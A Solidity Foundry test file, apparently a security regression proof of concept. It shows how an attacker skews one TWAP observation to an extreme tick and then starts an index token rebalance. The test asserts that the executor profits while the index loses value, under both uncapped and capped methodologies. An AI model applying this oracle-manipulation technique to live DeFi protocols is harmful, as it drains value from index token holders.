// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {SecurityRegressionTest} from "../Security.t.sol";
import {IndexToken} from "../../src/IndexToken.sol";
import {MockRebalanceExecutor} from "../mocks/MockRebalanceExecutor.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {console} from "forge-std/console.sol";

contract TwapExtractPoc is SecurityRegressionTest {
    function _depressOneBlock(address token) internal {
        // One 12-second observation at the extreme tick inside the 30-minute window, the rest at the true tick 0.
        bool token0 = token < address(weth);
        int56 delta = token0 ? int56(-887272) * 12 : int56(887272) * 12;
        market.tokenPool(token).setCumulatives(0, delta);
    }

    function _run(uint8 methodology, uint256[] memory units, uint256[] memory parts, uint256 sold) internal {
        (IndexToken base, address[] memory t) = _ruleBasket(parts, units);
        IndexToken idx = base;
        if (methodology == 1) {
            idx = IndexToken(factory.createIndex("Capped", "CAP", t, units, 1));
            _issueRule(idx, alice, 10e18);
        }
        vm.warp(idx.lastRebalance() + idx.MIN_REBALANCE_INTERVAL());
        (uint256[] memory honest,) = idx.previewTarget(0);
        _depressOneBlock(t[sold]);
        vm.prank(attacker);
        idx.startRebalance(0);
        market.setPriceTick(t[sold], 0); // the TWAP is honest again long before the auction
        (uint256 eta,, uint256[] memory targets) = idx.pendingRebalance();
        vm.warp(eta); // first second of the auction, multiplier 1.5
        (uint256 m,, uint256[] memory out, uint256[] memory amountsIn) = idx.previewRebalance();
        uint256 taken;
        uint256 delivered;
        uint256 value;
        for (uint256 i = 0; i < 5; ++i) {
            console.log("i", i, honest[i], targets[i]);
            taken += out[i];
            delivered += amountsIn[i];
            value += units[i] * 10;
        }
        new MockRebalanceExecutor().execute(idx, "");
        console.log("multiplier", m);
        console.log("taken (WETH at true prices)", taken);
        console.log("delivered", delivered);
        console.log("index value before", value);
        assertGt(taken, delivered, "executor profits at the opening multiplier; the index loses value");
        console.log("loss bps", (taken - delivered) * 10_000 / value);
    }

    function test_uncapped_offTarget_oneBlockExtremeTick() public {
        _run(0, _five(200e18, 100e18, 100e18, 100e18, 100e18), _five(1, 1, 1, 1, 1), 0);
    }

    function test_capped_restComponentOverweight() public {
        // top two by supply 30/20; rest share 50% equally, but component 2 holds far more than its share
        _run(1, _five(300e18, 200e18, 400e18, 100e18, 100e18), _five(30, 20, 5, 5, 5), 2);
    }
}
